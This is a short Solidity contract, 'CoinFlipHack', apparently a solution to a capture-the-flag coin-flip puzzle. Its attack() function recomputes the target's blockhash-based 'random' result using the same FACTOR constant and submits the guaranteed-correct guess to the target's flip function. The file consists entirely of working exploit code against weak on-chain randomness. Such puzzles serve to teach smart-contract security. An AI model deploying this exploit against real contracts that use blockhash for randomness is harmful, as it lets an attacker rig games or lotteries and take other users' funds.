// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface ICoinflip {
   function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    ICoinflip public target;
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address targetAddress) {
        target = ICoinflip(targetAddress);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        bool guess = coinFlip == 1 ? true : false;
        target.flip(guess);
    }
}
